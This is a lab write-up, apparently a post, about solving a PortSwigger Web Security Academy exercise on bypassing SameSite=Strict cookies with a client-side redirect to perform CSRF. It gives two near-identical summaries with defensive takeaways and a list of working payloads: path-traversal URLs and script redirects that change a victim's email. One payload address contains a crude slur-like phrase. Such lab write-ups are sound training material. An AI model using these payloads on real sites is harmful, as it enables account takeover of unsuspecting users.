@@ -1,0 +1,70 @@
+🚀 Lab 8 Completed: CSRF - SameSite Strict Bypass via Client-Side Redirect 🎯
+
+I just finished another thrilling lab on PortSwigger's Web Security Academy! This time, I tackled bypassing SameSite Strict cookie restrictions using a crafty client-side redirect.
+🔍 Key Insights:
+
+    Identified Issue: Session cookies were set with SameSite=Strict, typically designed to prevent CSRF attacks even during cross-site top-level navigation.
+    Exploited Flaw: Leveraged a client-side redirect to trick the victim’s browser into sending the protected cookies alongside the forged request.
+    Built Exploit: Designed a malicious website that used JavaScript to redirect the victim’s browser after loading the attack page, successfully bypassing SameSite Strict protections and changing the target user’s email address.
+
+🔑 Lessons Learned:
+
+    Defense in Depth: SameSite cookies (even Strict) aren’t a silver bullet.
+    Additional Protections: Always complement SameSite with CSRF tokens, origin checks, and secure request validation.
+    Validation is Key: Ensure that client-side redirects cannot be used to bypass authentication or session protections.
+
+
+Another milestone in my journey toward mastering web application security! 🌟
+
+
+
+Payloads used
+
+
+/post/comment/confirmation?postId=3 
+
+/post/comment/confirmation?postId=my-account/
+
+/post/comment/confirmation?postId=../my-account/ 
+https://0afe005a03ea95ea804e127200270059.web-security-academy.net /post/comment/confirmation?postId=3/../../my-account/
+
+/post/comment/confirmation?postId=../my-account/change-email?email=wiener%40hackedormal-user.net&submit=1
+
+/post/comment/confirmation?postId=../my-account/change-email?email=wiener%40hackedormal-user.net%26submit=1
+
+<script>
+window.location='https://0afe005a03ea95ea804e127200270059.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=wiener%40hackedormal-user.net%26submit=1';
+</script>
+
+<script>
+document.location='https://0afe005a03ea95ea804e127200270059.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=wiener%40hackedormal-user.net%26submit=1';
+</script>
+
+<script>
+document.location='https://0afe005a03ea95ea804e127200270059.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=foos%40whyareyugaynow.com%26submit=1';
+</script>
+
+
+
+
+
+
+
+
+
+🚀 Lab 8 Completed: CSRF - SameSite Strict Bypass via Client-Side Redirect 🎯
+
+Just wrapped up another awesome lab on PortSwigger's Web Security Academy! This one was all about bypassing SameSite=Strict cookie restrictions using a clever client-side redirect trick.
+🔍 What I Learned:
+
+    The Problem: The lab’s session cookies were protected with SameSite=Strict, which should block CSRF attacks by preventing cookies from being sent during cross-site navigation.
+    The Trick: I used a client-side redirect on a malicious site to bypass this restriction. The attack worked by redirecting the victim’s browser to the target URL after the malicious page loaded, forcing the browser to send the protected cookies.
+    The Attack: Built a simple exploit that successfully tricked the victim’s browser into sending a forged request to change their email address.
+
+🔑 Takeaways:
+
+    SameSite=Strict cookies are a strong defense but not foolproof.
+    Combining SameSite with CSRF tokens, origin checks, and validating all incoming requests makes your app much harder to exploit.
+    Always test for edge cases like redirects to make sure your defenses hold up!
+
+Getting better at spotting and exploiting vulnerabilities every day! 🔐
